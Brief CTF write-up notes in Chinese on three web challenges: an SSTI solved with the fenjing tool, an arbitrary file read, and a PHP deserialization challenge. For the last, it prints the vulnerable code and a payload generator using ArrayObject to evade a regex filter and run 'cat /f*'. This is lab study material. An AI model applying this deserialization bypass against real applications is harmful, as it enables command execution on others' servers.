- # easy_ssti
	- 打开F12看到信息泄漏，下载源码看到SSTI和对应的WAF函数，把WAF函数丢给fenjing, ok（还顺便给fenjing加了一点新功能）
- # easy_signin
	- 任意文件读取，读index.php即可
- # easy_php
  id:: 64b2aacc-598b-4be7-b7d4-48230820277e
	- [参考](https://blog.csdn.net/m0_64815693/article/details/130038356)
	- 题目：
		- ```php
		  $data = $_GET['1+1>2'];
		  var_dump($data);
		  if(!preg_match("/^[Oa]:[\d]+/i", $data)){
		      echo "start";
		      $o = unserialize($data);
		      var_dump($o);
		  }else{
		      echo "nope";
		  }
		  ```
	- 题目要求反序列化的字符串不能为对象或者关联数组，我们可以使用自定义序列化对象ArrayObject，其反序列化后以C开头
		- ```php
		  $o = new ctfshow();
		  $o -> ctfshow = "cat /f*";
		  $o -> zzz = "a";
		  $a = new ArrayObject([114 => 514]);
		  $a -> o = $o;
		  echo urlencode(serialize($a));
		  ```
	- 对象o在执行wakeup后会立即destruct